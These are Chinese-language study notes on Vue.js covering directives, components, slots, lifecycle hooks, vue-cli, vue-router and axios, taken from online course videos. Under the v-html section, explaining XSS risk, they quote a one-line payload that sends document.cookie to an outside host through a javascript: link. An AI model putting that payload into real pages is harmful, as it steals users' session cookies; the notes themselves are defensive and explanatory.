# 千锋Vue学习笔记

[toc]

## 写在前面

- 封面 | 摘要 | 关键词

  ![首页](https://img-blog.csdnimg.cn/c944cb785bb946898ed1a018ad717104.jpeg)

  千锋Vue学习笔记

  ```
  Vue
  李英俊
  前端
  千锋
  ```
  
- 学习链接

  1. [千锋HTML5前端开发教程1000集](https://www.bilibili.com/video/BV17z4y1D7Yj)：`[P428: P568]，共139集`
  2. [千锋教育前端Vue3.0全套视频教程（Kerwin2023版，Vue.js零基础，Vue3入门到实操）](https://www.bilibili.com/video/BV1Ss4y1T7mZ/)
  
- 感想 | 摘抄

  - vue的架构模式是mvvm（双向绑定）（不是mvc）
  - 需要计算属性的逻辑，写在 `computed` 中，因为多次使用的话，函数会调用多次，而计算属性只会运行一次。
  - ajax、fetch、xhr是什么关系

    - ajax是异步或局部更新页面的技术
    - xhr是实现ajax的方法，xhr过时了，改成fetch
    - [fetch兼容性不好](https://caniuse.com/?search=fetch)，如果不支持可以用fetch-ie8，实际就是检测浏览器不支持fetch的话，就改为xhr
  - diff算法在判断的时候，如果标签tag不一样，会当机立断直接换掉虚拟dom；如果没有key，且标签一样，则diff算法只会看值是否改变，所以动画就不会更新；如果给同样的div加上不同的key值，则可以让虚拟dom

    - 把树按照层级分解对比

      ![在这里插入图片描述](https://img-blog.csdnimg.cn/b281090eaede46d7acff0910504907f4.png)
    - 同key值对比

      ![在这里插入图片描述](https://img-blog.csdnimg.cn/ca008aa2eeac4bd1b910d6a583c48564.png)
    - 同组件对比

      ![在这里插入图片描述](https://img-blog.csdnimg.cn/43ade5ca82994729984def73645eda45.png)
  - 隐藏：

    - `display: none`：不占位
    - `visibility: hidden`：隐藏内容且占位
  - 连接后面的随机数：强行刷新，不让浏览器拿缓存
  - 善于使用 `v-if` 对应该初始化为null的数据加标签
  - 同一个tag里，动态绑定的 `:class`，和静态绑定的 `class` 会共存；style同理
  - 在es6中合并数组的技巧：

    - 已有数组：`a`
    - 获取新的数组：`b`
    - 合并数组：`a = [...a, ...b]`
  
  - vue路由history模式怎么解决nginx部署刷新404的问题：[vue路由history模式刷新404问题解决方案](https://blog.csdn.net/weixin_42138029/article/details/116980747)
  
- 直通车

- `<span style="color: skyblue; font-weight: bold">`PS：相关工程代码都在 Github 上

## 1. 前言

1. Vue是通过拦截变量的get和set方法，来进行监听和更新的
2. `Object.defineProperty`有以下缺点：
   1. 无法监听es6的Set、Map变化
   2. 无法监听Class类型的数据
   3. 属性的新加或者删除也无法监听
   4. 数组元素的增加和删除也无法监听
3. `:src`、`:class`这样的写法的完整写法是：`v-bind:src`
4. 同理，事件 `@click`绑定的完整写法是：`v-on:click`

## 2. 模板语法

1. 插值

   1. 文本：`{{}}`
   2. 纯HTML

      ```
      v-html，放置XSS, CSRF(
      	(1) 前端过滤
      	(2) 后台转义(<> < >)
      	(3) 给cookie加上属性http
      )
      
      <a href=javascript:location.href='http://www.baidu.com?cookie='+document.cookie>click</a>
      ```
   3. 表达式
2. 指令：是带有 `v-` 前缀的特殊属性

   - `v-bind`：动态绑定属性
   - `v-if`：动态创建/删除
     - `v-else`
     - `v-else-if`
     - `template v-if`：包装元素template不会被创建
   - `v-show`：动态显示/隐藏
   - `v-on:click`：绑定事件
   - `v-for`：遍历
   - `v-model`：双向绑定表单
3. 缩写

   1. `v-bind:src`：`:src`
   2. `v-on:click`：`@click`
4. 关于vue数据对象新增拦截属性的解决方案

   - vue2：
     - `Vue.set(vm.classobj, "dd", true)`
     - `Vue.set(vm.styleobj, "fontSize", "30px")`
   - vue3: 支持动态增加属性的拦截
   - **动态切换这里可以用对象，也可以用数组，用数组的时候vue两个版本都正常**
   - 注意：如果是直接操作 `:style` 的形式，需要按照js的语法去设置css，即需要用驼峰命名法
5. template是一个包装元素，可以控制子元素的同生共死，同时不会影响dom结构
6. 列表渲染

   1. `v-for`（特殊 v-for=“n in 10”）

      1. in
      2. of

      没有区别
   2. key

      1. 跟踪每个节点的身份，从而重用和重新排序现有元素
      2. 理想的key值是每项都有的且唯一的id，data.id
   3. 数组更新检测

      1. 使用以下方法操作数组，可以检测变动

         - `push`
         - `pop`
         - `shift`
         - `unshift`
         - `splice`
         - `soft`
         - `reverse`
      2. 新数组替换旧数组

         - `filter`
         - `concat`
         - `slice`
         - `map`
      3. 不能检测以下变动的数组

         ```
         vm.items[indexOfItem] = newValue
         ```

         *解决*：

         - `Vue.set(example1.items, indexOfItem, newValue)`
         - splice
      4. 应用：显示过滤结果
   4. 事件处理

      1. 监听事件-直接触发代码
      2. 方法事件处理器-写函数名 handleClick
      3. **内联处理器方法-执行函数表达式**  `handleClick($event)`，`$event` 事件对象
         - 推荐
         - 需要加对事件的引用的话，就直接$加上就行，全包~
      4. 事件修饰符
         - .stop：阻止事件向上冒泡
         - .prevent
         - .capture
         - .self：只有点击自己的时候才会触发
         - .once：只能触发一次，触发完之后解除事件绑定了
         - .enter：`@keyup.enter`，回车触发事件；组合键：`@keyup.ctrl.enter`，按键修饰符：
           - .esc
           - .up
           - .down
           - .left
           - .right
           - .space
           - .ctrl
           - .shift
           - .delete
           - **注意，除了这些常用的按键之外，可以直接用类似 `@keyup.65` 键值的属性来模拟对应的按键**
   5. vue 操作dom底层，虚拟dom

      ![在这里插入图片描述](https://img-blog.csdnimg.cn/2785ead09eab41e688201be7a350a6ae.png)

      ![在这里插入图片描述](https://img-blog.csdnimg.cn/3ab4b9b9db954230a111a3118a7ea8f8.png)
   6. change和input的区别

      - change只有在输入框失去焦点，且内容发生改变时，才会触发函数
   7. 函数加括号和不加括号的区别

      - 需要传参的时候加括号
      - 如果不加括号：可以**获取事件对象**

        函数增加形参 `evt`，那么 `evt.target` 就是源dom，`evt.target.value` 就是input dom里的值
      - 如果两种参数都需要传递的话，采用该方案：`handleAdd1($event, param_1, param_2, param_3)`

        - 这里的 `$event` 是写死的，不能换其他的变量名
      - 直接写表达式同样可以完成该请求：`count++`
7. 一些知识

   - data：状态，被拦截
   - 方法，methods：事件绑定，逻辑计算。可以不用return，没有缓存
   - 计算属性（重视结果），computed：解决模板过重的问题，必须有return，只求结果，有缓存，同步。
   - watch（重视过程）：监听一个值的改变，不用返回值，异步同步。
8. fetch

   - get：

     ```js
     handleFetch() {
         fetch("./json/test.json").then(res => {
             // 状态码，响应头，拿不到真正的数据
             return res.json()
         }).then(res => {
             console.log(res);
         }).catch(err => {
             console.log(err);
         })
     }
     ```
   - post：

     ```js
     // post-1
     handleFetchPost1() {
         fetch("**", {
             method: 'post',
             headers: {
                 "Content-Type": "application/x-www-form-urlencoded"
             },
             body: "name=kerwin&age=100",
         }).then(res => res.json()).then(res => { console.log(res); })
     },
     // post-2
     handlejFetchPost2() {
         fetch("**", {
             method: 'post',
             headers: {
                 'Content-Type': 'application/json',
             },
             body: JSON.stringify({
                 name: 'kervin',
                 age: 100
             })
         }).then(res => res.json()).then(res => { console.log(res); })
     }
     ```
   - 注意：fetch请求默认是不带cookie的，需要设置 `fetch(url, {credentials: 'include'})`
9. axios：非官方的好用的库

   ```js
   handleClick(){
       axios.get("./json/movie.json").then(res=>{
           console.log(res.data.data.films);
           this.dataList = res.data.data.films
       })
   }
   ```
10. 过滤器（管道符）：`|`

    - 把原始数据通过管道送给过滤器进行加工

      ```html
      <img :src="item.img | imgFilter" />
      ```
    - 过滤器的定义

      ```vue
      Vue.filter("imgFilter", (url) => {
      	return url.replace('w.h/', '')+'@1l_1e_1c_128w_180h'
      })
      ```
    - 多个过滤器串行处理：`<img :src="item.img | imgFilter1 | imgFilter2" />`
    - vue3不支持

## 3. 组件

1. 组件定义

   - `<swiper></swiper>`
   - Why?：扩展html元素，封装可重用的代码
   - 方案

     - 全局创建组件
     - 局部创建组件
   - 注意：

     1. 起名字：组件名如果用了驼峰写法，在html中需要把大写换成小写，再用-隔开

        ```
        <div id="box">
            <yingjun-navbar></yingjun-navbar>
        </div>
        
        Vue.component("yingjunNavbar"...
        ```
     2. dom 片段没有代码提示，没有高亮显示：**vue单文件组件可以解决**
     3. css 只能写成行内：**vue单文件组件可以解决**
     4. template 包含一个根节点：**不能有兄弟节点**
     5. 组件是孤岛，无法直接访问外面组件的状态或者方法：**间接的组件通信来交流**
     6. 所有的组件都在一起，太乱了：**vue单文件组件可以解决**
2. 全局和局部

   - 父传子：`props: ["变量名"]`
   - 属性验证：改list为dict

     ```
     props: {
         myname: String,
         myright: Boolean
     }
     ```
   - 加上默认值

     ```
     props: {
         myname: {
             type: String,
             default: ""
         },
         myright: {
             type: Boolean,
             default: true
         }
     },
     ```
   - 父传子的理解：data中定义的a，可以传给模板component的**属性**，然后该属性在component的props中定义，这就实现了父类变量->子类变量的映射，从而实现传值，最后在template中使用该值。注意：上述**属性**前记得加 `:`
   - 如果父传子靠**属性**，那么子传父靠的是**事件**

     ![在这里插入图片描述](https://img-blog.csdnimg.cn/e318f3bbf463403a8b22dbe570a43acc.png)
   - bus：中央事件总线，订阅发布模式

     ![在这里插入图片描述](https://img-blog.csdnimg.cn/a893d0f571d04e969c1da9a5c68b798e.png)
   - vuex：状态管理
   - 组件refs

     - ref 绑定dom节点，拿到的就是dom对象
     - ref 绑定组件，拿到的就是 组件对象
   - **属性**：父组件传给你的属性，只有父组件可以重新传，但不允许子组件随意修改
   - **状态**：组件内部的状态，可以随意修改
   - `v-once`：你可能有一个组件，这个组件包含了大量的静态内容，在这种情况下，你可以在根元素上添加 `v-once` attribute以确保这些内容只计算一次然后缓存起来
3. 动态组件

   - 如果没有动态组件，那么在实现页面的时候，需要把所有的组件都写上，用一个变量来控制 v-show

     ```
     <home v-show="which==='home'"></home>
     <list v-show="which==='list'"></list>
     <shopcar v-show="which==='shopcar'"></shopcar>
     ```
   - 有动态组件的时候，一行就可以解决

     ```
     <component :is="which"></component>
     ```
4. slot 插槽|内容分发

   - 扩展组件能力，让组件的封装性、复用性更好
   - 父组件模板的内容在父组件作用域内编译，子组件模板的内容在子组件作用域内编译
   - 获取组件里面的内容放入模板的 slot中

     ```html
     <body>
         <div id="box">
             <child>
                 <div>1111111</div>
                 <div>222222222</div>
             </child>
         </div>
         <script>
             Vue.component("child", {
                 template: `
                     <div>
                         child
                         <slot></slot>
                         <slot></slot>
                     </div>
                 `
             })
             new Vue({
                 el: "#box"
             })
         </script>
     </body>
     ```
   - 具名插槽：`<slot name="a"></slot>`

     ```html
     <body>
         <div id="box">
             <child>
                 <div slot="a">1111111</div>
                 <div slot="b">222222222</div>
                 <div slot="c">33333</div>
                 <div>44444</div>
             </child>
         </div>
         <script>
             Vue.component("child", {
                 template: `
                     <div>
                         child
                         <slot name="a"></slot>
                         <slot name="b"></slot>
                         <slot name="b"></slot>
                         <slot name="c"></slot>
                         <slot></slot>
                     </div>
                 `
             })
             new Vue({
                 el: "#box"
             })
         </script>
     </body>
     ```
   - 新版slot写法 template

     ```vue
     <body>
         <div id="box">
             <navbar>
                 <!-- <button slot="left">aaa</button> -->
                 <template #left>
                     <div>
                         <button>aaa</button>
                     </div>
                 </template>
                 <!-- <i class="iconfont icon-all" slot="right">字体图标</i> -->
                 <template #right>
                     <div>
                         <i class="iconfont icon-all">字体图标</i>
                     </div>
                 </template>
             </navbar>
             <child>
                 <template v-slot:a>
                     <div>
                         1a1a1a
                     </div>
                 </template>
                 <template #b>
                     <div>
                         2b2b2b2
                     </div>
                 </template>
                 <!-- <div slot="a">1111111</div> -->
                 <div slot="b">222222222</div>
                 <div slot="c">33333</div>
                 <div>44444</div>
             </child>
     
         </div>
         <script>
             Vue.component("navbar", {
                 template: `
                     <div>
                         <slot name="left"></slot>
                         <span>navbar</span>
                         <slot name="right"></slot>
                     </div>
     
                 `
             })
             Vue.component("child", {
                 template: `
                     <div>
                         child
                         <slot name="a"></slot>
                         <slot name="b"></slot>
                         <slot name="b"></slot>
                         <slot name="c"></slot>
                         <slot></slot>
                     </div>
                 `
             })
             new Vue({
                 el: "#box"
             })
         </script>
     </body>
     ```
5. 动画过渡

   ```vue
   <!DOCTYPE html>
   <html lang="en">
   <head>
       <meta charset="UTF-8">
       <meta http-equiv="X-UA-Compatible" content="IE=edge">
       <meta name="viewport" content="width=device-width, initial-scale=1.0">
       <title>Document</title>
       <script type="text/javascript" src="lib/vue.js"></script>
       <style>
           /* 进场动画 */
           .yingjun-enter-active {
               animation: aaa 0.5s;
           }
   
           /* 出场动画 */
           .yingjun-leave-active {
               animation: aaa 0.5s reverse;
           }
           @keyframes aaa {
               0% {
                   opacity: 0;
                   transform: translateX(100px);
               }
               100% {
                   opacity: 1;
                   transform: translateX(0px);
               }
           }
       </style>
   </head>
   <body>
       <div id="box">
           <button @click="isShow = !isShow">change</button>
           <!-- 动画入场和离场 -->
           <transition enter-active-class="yingjun-enter-active" leave-active-class="yingjun-leave-active">
               <div v-show="isShow">11111111111</div>
           </transition>
           <!-- 简写 -->
           <transition name="yingjun">
               <div v-show="isShow">11111111111</div>
           </transition>
           <script>
               new Vue({
                   el: "#box",
                   data: {
                       isShow: false
                   }
               })
           </script>
       </div>
   </body>
   </html>
   ```

- 初始添加动画：`<transition name="yingjun" appear>`
- 给每个 li 加动画，需要用到 `transition-group`

  - 需要注意的是，li一定要设置 `:key` 且不能重复
  - `transition-group` 会实例化一个 `span` 标签加在 li 外面，`transition` 不会
  - 支持一个参数 `tag` 用来设置这个标签是什么

    `<transition-group name="yingjun" tag="ul">` ，一般tag设置为 ul 来代替外围的ul
- 可复用过渡：通过把transition封装到组件的方式实现，变量交互为 `:name`，通过设置不同的css 的动画name，在使用时只需要传对应的name，就可以实现对应的css动画

  ```vue
  <sidebar v-show="isShow" mode="yingjun"></sidebar>
  
  Vue.component("sidebar", {
              props:["mode"],
              template: `
              <transition :name="mode">
              <ul style="background-color: yellow; width: 200px; height: 500px;">
                  <li>111--{{mode}}</li>
                  <li>111</li>
                  <li>111</li>
                  <li>111</li>
              </ul>
          	</transition>
  			`
  })
  ```

## 4. 生命周期

1. Vue的生命周期

   ![Vue 实例生命周期](https://v2.cn.vuejs.org/images/lifecycle.png)
2. 创建阶段

   - beforeCreate：没啥用
   - ==created==：在create之后开始创建状态，可以在 `created` 函数中进行 **初始化状态或者挂在到当前实例的一些属性**，可以在这里定义全局变量，这里的全局变量**不可修改**。
   - template：没有的话渲染el中的内容，有的话就会渲染template中的内容
   - beforeMount：还没有替换dom节点，基本没啥用，可以获得解析之前的dom。在模板解析之前最后一次修改模板的节点
   - ==mounted==：拿到真实的dom节点，可能会有一些依赖于dom创建之后，才进行初始化工作的插件，比如 **轮播插件**；订阅 `bus.$on`；**发ajax**

     - 获取数据啊啥的，很关键！就不用点按钮了
3. 更新阶段

   - beforeUpdate：更新之前，可以记录旧的dom，这里可以用来记录进度条的位置啥的
   - updated：更新完成后，获取更新后的dom节点，可以进行swiper轮播的初始化工作，数据更新完，并且已经到DOM中
   - 虚拟dom创建，diff对比：状态立即更新，dom异步更新，也就是说，更新前无法获取页面的dom，**updated** 之后，dom才都成功上树
4. 销毁阶段

   - 销毁前后（`beforeDestroy`、`destroyed`）需要清除定时器、事件解绑等
   - 倒计时的消除，windows函数的消除

     ```js
     clearInterval(this.id)
     window.onresize = null
     ```
5. 面试问题：下列的描述都是问上面8个生命周期

- vue 组件 生命周期
- vue 组件的 钩子函数
- vue组件的生命周期钩子函数

## 5. swiper

1. `list.map(item=>${}`：js 中对数组进行map是映射，把列表中的每一个元素映射成一个字符串
2. swiper的初始化要放到dom插入完成之后，动态生成dom的过程要放到swiper初始化之前
3. 更新是异步的，会导致数据更新了dom没有更新，需要把swiper的初始化放在updated中，而数据更新放在mounted中
4. 上述操作的缺点：

   - 无法复用
   - 修改其他状态，其他状态更新，update会重新运行，`new Swiper`会执行多次，产生bug
5. swiper组件

   1. 给swiper 加一个 `:key` ，值为数组的长度，这样就可以在数组发生变化的时候对swiper进行毁灭和重建，因此为 mounted - destroyed - monted。
   2. 因为数据加载是异步的，那么数据没有加载到的时候，长度就为0，加载完了之后就为2，状态发生了变化。
   3. 更进一步，不用 `:key` ，直接用 `v-if`，也就是说在没数据的时候，不要创建组件，有数据了再说
6. Vue3的组件

   1. 不再通过 `Vue.component` 定义
   2. 需要通过函数的方式调用生成实例，再调用函数的方式生成

      ```js
      var obj = {
          data() {
              return {
                  myname: "kerwin"
              }
          },
          methods: {
      
          },
          computed: {
      
          },
      
      }
      const app = Vue.createApp(obj)
      app.component("navbar", {
          props: ["myname"],
          template: `
                  <div>
                      navbar-{{myname}}
                      <slot></slot>
                  </div>
              `
      })
      app.mount("#box")
      ```
   3. 生命周期名称替换：`destoryed` -> `unmounted`；`beforeDestroy` -> `beforeUnmount`
   4. Vue2中是以类的写法去实现的，Vue3中是以类（>90%是一样的）+hooks（函数）写法去实现的

## 6. 指令

1. 指令的出现：就是为了把一些dom操作封装在指令里面
2. `directives`
3. 生命周期函数

   1. `bind`：类似 `create`。只调用一次，指令第一次绑定到元素的时候调用，在这里可以进行一次性的初始化设置
   2. `inserted`：类似 `mounted`。当前节点 **第一次** 插入到父节点中时调用，仅保证父节点存在，但不一定已经被插入文档中
   3. `update`：类似 `beforeUpdate`。当且节点 更新时 执行，但是可能发生在其子 **VNode** 更新之前。指令的值可能发生了改变，也可能没有。但是你可以通过比较更新前后的值来忽略不必要的模板更新
   4. `componentUpdated`：类似 `updated`。指令所在组件的VNode及其子 VNode 全部更新后调用
   5. `unbind`：类似 `destroyed`。只调用一次，指令与元素解绑时调用

   ```js
   Vue.directive("hello", {
       // 指令的生命周期函数
       inserted(el, binding){
           console.log("inserted", binding);
           el.style.background = binding.value
       },
       update(el, binding) {
           console.log("update");
           el.style.background = binding.value
       },
   })
   var vm = new Vue({
       el: "#box",
       data: {
           whichColor: 'blue'
       }
   })
   ```
4. 简写方式：将 `{}` 的内容，改为函数

   ```js
   Vue.directive("hello", (el, binding) => {
       console.log("创建更新都会执行");
       el.style.background = binding.value
   })
   var vm = new Vue({
       el: "#box",
       data: {
           whichColor: 'blue'
       }
   })
   ```
5. vue3生命周期改变：

   - `inserted` -> `mounted`，等等
   - 除了没有 `beforeCreate` ，其他的7个生命周期都有
6. nextTick

   - 一个抄近道的方法，不适合用于封装
   - 比updated走的都晚，而且只执行一次
   - 一般在修改的状态后面，触发nextTick

     ```js
     this.$nextTick(() => {
     	console.log("我比updated执行的都晚，而且只执行一次")
     })
     ```

## 7. vue-cli

1. 安装vue的脚手架，一次安装永久使用：`npm i -g @vue/cli`
2. 自定义安装：`vue create 项目名`

   ![在这里插入图片描述](https://img-blog.csdnimg.cn/0936f2b0db8d4d46940600c998b1f166.png)
3. eslint导致的无法运行解决方案：

   1. `npm run lint`
   2. vscode自动修复eslin，安装eslint插件，并启用
   3. 暂时关掉，最后用①统一修复 `(vue.config.js) lintOnSave: false`
4. 整个项目中除了 `main.js` 不可以改，其他的都可以改
5. 模块开发：在哪用，在哪引

   ```js
   import navbar from './components/Navbar'
   import Vue from 'vue'
   ```

   - 全局注册：`Vue.component("navbar", navbar)`
   - 局部注册：冒号可以省略，也不用导入Vue了

     ```js
     components: {
         // navbar: navbar,
         navbar
     }
     ```
6. 局部作用域：`<style lang="scss" scoped>`

   - 如果想局部影响：`scoped`
   - 如果想全局影响：不加
7. 子传父：

   - 子组件 触发器（按钮）绑定点击事件，事件函数中：`this.$emit('event')`
   - `event`事件在html的组件A中定义：`<navbar myname="home" :myright="false" @event="handleEvent">`
   - 然后在函数中管理组件B的对应操作：`<sidebar v-show="isShown"></sidebar>`

     ```js
     handleEvent(){
     	this.isShown = !this.isShown
     }
     ```
8. 生命周期、指令、过滤器

   ```js
   import Vue from "vue";
   
   Vue.directive("hello", {
     inserted(el, binding) {
       console.log(el);
       el.style.border = "1px solid black";
     },
   });
   Vue.filter("imgFilter", (path) => {
     return path.replace("/w.h", "") + "123123asdasd";
   });
   ```

## 8. Vue.config.js

1. 配置反向代理

   ```vue
     devServer: {
       proxy: {
         "/ajax": {
           target: "https://m.maoyan.com",
           changeOrigin: true
         },
   
         // 凡是kerwin请求的，都会拦截之后，进行路径的替换和反向代理
         "/kerwin": {
           target: "https://m.maizuo.com",
           changeOrigin: true,
           pathRewrite: {
             "/kerwin": ''
           }
         },
       }
     }
   ```
2. 别名：`@`，永远指向src的绝对路径，webpack配置的别名，即 `/src`

## 9. 路由

单页面应用：SinglePage Web Application, SPA

多页面应用：MultiPage Web Application, MPA

|                   | 单页面应用                                                               | 多页面应用                                   |
| ----------------- | ------------------------------------------------------------------------ | -------------------------------------------- |
| 组成              | 一个外壳页面和多个页面片段组成                                           | 多个完整页面组成                             |
| 资源共用(css, js) | 公用，只需在外壳部分加载                                                 | 不共用，每个页面都需要加载                   |
| 刷新方式          | 页面局部刷新或更改                                                       | 整页刷新                                     |
| url模式           | a.com/#/1, a.com/#/2                                                     | a.com/1.html, a.com/2.html                   |
| 用户体验          | 页面片段间的切换快，用户体验良好                                         | 页面切换加载缓慢，流畅度不够，用户体验比较差 |
| 转场动画          | 容易实现                                                                 | 无法实现                                     |
| 数据传递          | 容易                                                                     | 依赖url传参，或者cookie，localStorage等      |
| 搜索引擎优化(SEO) | 需要单独方案、实现较为困难、不利于SEO检索，可以利用服务器端渲染(SSR)优化 | 实现方法简易                                 |
| 试用范围          | 高要求的体验度、追求界面流畅的应用                                       | 适用于追求高度支持搜索引擎的应用             |
| 开发成本          | 较高，常需借助专业的框架                                                 | 较低，但页面重复代码多                       |
| 维护成本          | 相对容易                                                                 | 相对复杂                                     |

1. vue-router 配置

   ![在这里插入图片描述](https://img-blog.csdnimg.cn/3f6104ff87e94280bdced127c2a12446.png)
2. 在 `index.js` 中通过设置 **mode: ‘history’** 来取消默认自带的 `/#/`
3. 路由配置：

   ```
   const routes = [
     {
       path: '/films',
       component: Films
     },
   ]
   ```
4. 首页重定向

   ```
   {
       path: '/',
       redirect: '/films'
     }
   ```
5. 任意路径重定向：按顺序匹配，等到了通配符就会直接重定向

   ```
   // 最后一道防线，匹配不到就走这个
   {
       path: '*',
       redirect: '/films'
     }
   ```
6. a 链接跳转方式：不方便设置高亮等
7. `router-link`：**声明式导航**，通过设置 `.router-link-active` 的样式来控制当前选择的导航高亮，同样可以设置自己的 `active-class` 属性以及对应的样式，来控制

   - `to`
   - `active-class`
   - `tag`：当前标签会被tag指定的标签渲染，比如设置为 `li` 这样外面就不用再包裹 li 了

     - 需要注意的是，tag在高版本 `router-link` 中，已经弃用了。替换的，要使用 `custom v-slot`

       ```
       <router-link to="/center" custom v-slot="{ navigate, isActive }">
               <li @click="navigate">我的--{{ isActive }}</li>
       </router-link>
       ```
8. 嵌套路由

   - 在对应的路由下，增加孩子路由

     ```
     {
         path: '/films',
         component: Films,
         children: [
           {
             path: '/films/nowplaying',
             component: NowPlaying
           },
           {
             path: '/films/comingsoon',
             component: ComingSoon
           },
           {
             path: '/films',
             redirect: '/films/nowplaying'
           }
         ]
       },
     ```
   - 对孩子路由中，设置重定向

     ```
     {
             path: '/films',
             redirect: '/films/nowplaying'
     }
     ```
   - **编程式导航**

     - 主要就是通过给tag加点击事件实现

       ```
       <li v-for="data in datalist" :key="data" @click="handleChangePage">
       ```
     - 然后函数里跳转到对应的页面

       ```
       location.href = "#/detail"
       ```
     - 上面是浏览器自带的，但是存在问题：**如果不是#这种路由模式，该方案就失效了**，所以推荐使用vue自带的

       ```
       this.$router.push("/detail")
       ```
   - 使用范围：

     - 如果是固定的几个：声明式导航
     - 如果有很多选项：编程式导航
     - `this.$router === router`
9. 列表到详情页开发流程

   ![在这里插入图片描述](https://img-blog.csdnimg.cn/2795c2b131784d71b4c42901769f2b27.png)

   - 动态路由 index.js

     ```
     {
         // 动态路由
         path: '/detail/:myid',
         component: Detail
       },
     ```
   - 拿到路由后面的通配符：`this.$route.params.名称（比如myid）`
   - 命名路由

     ```
     {
         // 动态路由
         name: "detail",  // 命名路由
         path: '/detail/:myid',
         component: Detail
       },
     ```

     通过命名路由跳转

     ```
     this.$router.push({
             name: "detail",
             params: {
               myid: id,
             },
           });
     ```
   - 重定向：

     - `{path: '/a', redirect: {name: 'foo'}}`
     - `{path: '/a', redirect: '/b'}`
   - 别名：`{path: '/a', component: A, alias: '/b'}`，当访问 `/b` 时，url保持为 `/b` ，但是路由匹配为 `/a`
   - 如果路由中带 `#` ，那么一定是前端路由；不带的话，不好判断

     - 如果不想要很丑的 hash，我们可以用路由的 **history 模式**，这种模式充分利用history.pushstate API 来完成 URL跳转而无须重新加载页面
     - 使用 history 需要注意：如果后台没有正确的配置，浏览器看到url后会给后端发请求，这时候就会404，**浏览器不知道这是前端路由还是后端路由**
     - 为了解决上述问题，需要在服务器增加一个覆盖所有情况的候选资源：如果URL匹配不到任何静态资源，则应该返回同一个 `index.html` 页面，这个页面就是app依赖的页面
     - 有的软件在分享的时候会自动给url加上 `#` ，所以不能用 hash 的路由，否则会出问题，所以history路由很关键
   - 返回上一页：`this.$router.back()`
10. 路由拦截

    - 全局拦截

      ```
      router.beforeEach((to, from, next) => {
        if (某几个需要授权的路由) {
          if (授权通过) {
            next()
          } else {
            next("/login")
          }
        } else {
          next()
        }
      })
      ```
    - 拦截后重定向到原来的页面

      1. next中需要写 `query`参数

         ```
         next({
                 path: "/login",
                 query: {
                   redirect: to.fullPath
                 }
               })
         ```
      2. 登录页面中，登录完后，跳转到redirect保存的url去

         ```
         handleLogin() {
               setTimeout(() => {
                 localStorage.setItem("token", "asdfasdf");
                 // this.$router.back();
         
                 // 1. 获取 query 字段
                 console.log(this.$route.query.redirect);
                 // 2. 跳转到当时想要跳的页面去
                 this.$router.push(this.$route.query.redirect);
               }, 0);
             }
         ```
    - 局部拦截

      - 路由独享的守卫：对某些路由单独进行守卫

        ```vue
        {
            path: '/center',
            component: Center,
            meta: {
              isRequired: true,
            },
            beforeEach: (to, from, next) => {
              next()
            }
          },
        ```
      - 组件内的守卫：对组件内的路由进行控制，**路由生命周期**

        ```
          beforeRouteEnter(to, from) {
            // 在渲染该组件的对应路由被验证前调用
            // 不能获取组件实例 `this` ！
            // 因为当守卫执行时，组件实例还没被创建！
          },
          beforeRouteUpdate(to, from) {
            // 在当前路由改变，但是该组件被复用时调用
            // 举例来说，对于一个带有动态参数的路径 `/users/:id`，在 `/users/1` 和 `/users/2` 之间跳转的时候，
            // 由于会渲染同样的 `UserDetails` 组件，因此组件实例会被复用。而这个钩子就会在这个情况下被调用。
            // 因为在这种情况发生的时候，组件已经挂载好了，导航守卫可以访问组件实例 `this`
          },
          beforeRouteLeave(to, from) {
            // 在导航离开渲染该组件的对应路由时调用
            // 与 `beforeRouteUpdate` 一样，它可以访问组件实例 `this`
          },
        ```
11. 路由懒加载

    - 不要用直接导入：`import Login from '@/views/Login'`
    - 在用的时候导入：

      ```
        {
            path: '/order',
            component: () => import("@/views/Order"),
            meta: {
              isRequired: true,
            }
          }
      ```
12. 路由原理

    1. hash 路由
       - location.hash：切换
       - window.onhashchange：监听路径的切换
    2. history 路由
       - history.pushState：切换
       - window.onpopstate：监听路径的切换

## 10. 小练习和组件库

1. rem

   - 由于设备dpr的原因，所以在设计的时候，需要根据dpr的大小进行缩放
   - 一般为2，所以长宽在设计的时候 ➗ 2
   - dpr：device pixel ratio
   - 可布局的宽度：`document.documentElement.clientWidth`
   - 设置根节点的fontsize：`document.documentElement.style.fontSize='100px'`
   - rem是基于根节点进行比例缩放的
   - 所以rem基于的值应该针对不同的设备是变化的，这里就要设成可布局的宽度 ➗ 设计稿实际宽度（未缩放的，比如750）✖ 100 px，以根节点的100为单位
   - 除此之外，还有不 ✖ 100，而是 ✖ 16，这样是以字体大小为基准的，因为字体是16；100好算，16不好算
2. swiper

   - components里面放公共的组件，或者当前组件的孩子组件
   - views里面放页面的vue
   - 如果只是单纯的 `new Swiper` 的话，用lint会报错 `no-new` ，因此可以在 `.eslintrc.js` 中关掉对应的rules
   - 同理，可以关掉未用变量的规则

     ```js
     rules: {
         'no-console': process.env.NODE_ENV === 'production' ? 'warn' : 'off',
         'no-debugger': process.env.NODE_ENV === 'production' ? 'warn' : 'off',
         'no-new': 'off',
         'no-unused-vars': 'off'
       }
     ```
3. 选项卡封装

   1. public下的东西都可以直接通过 `/` 来找到
   2. assets下的东西是通过模块化的方式来找到

      ```html
      <script>
      	import '../assets/iconfont/iconfont.css'
      	export default {}
      </script>
      ```

      以模块的方式导入的样式，都会做成 style 内部样式 插到head中
4. 透传

   - vue可以实现，在组件上加class，实际上传递到了组件内部最外面的tag上（跳过最外层的div）
   - react做不到
5. 吸顶功能：往下滑的时候，菜单黏在顶部

   - top设置为0的时候，开始粘

     ```css
     .sticky {
       position: sticky;
       top: 0px;
       background: white;
     }
     ```
   - position一共有6个值

     - static
     - relative
     - absolute
     - fixed
     - sticky
     - inherit：继承父属性
6. 对于axios封装

   1. 直接对于数据请求的封装

      ```js
      import axios from "axios"
      function http() {
          return axios({
              url: "https://m.maizuo.com/gateway?cityId=440300&pageNum=1&pageSize=10&type=1&k=3602463",
              headers: {
                  "X-Client-Info":
                      '{"a":"3000","ch":"1002","v":"5.2.1","e":"1689149181904756335738881"}',
                  "X-Host": "mall.film-ticket.film.list",
              },
          })
      }
      
      export default http
      ```
   2. axios自带的封装方案

      ```js
      
      import axios from "axios"
      const http = axios.create({
          baseURL: "https://m.maizuo.com/gateway?cityId=440300&pageNum=1&pageSize=10&type=1&k=3602463",
          timeout: 10000,
          headers: {
              "X-Client-Info":
                  '{"a":"3000","ch":"1002","v":"5.2.1","e":"1689149181904756335738881"}',
              "X-Host": "mall.film-ticket.film.list",
          },
      })
      
      export default http
      ```
   3. 还可以在发请求之前拦截：showLoading
   4. 在成功后拦截：hideLoading
7. 动态绑定style，实现图像展示

   ```js
   <div
     :style="{
       backgroundImage: 'url(' + filmInfo.poster + ')',
     }"
     class="poster"
   ></div>
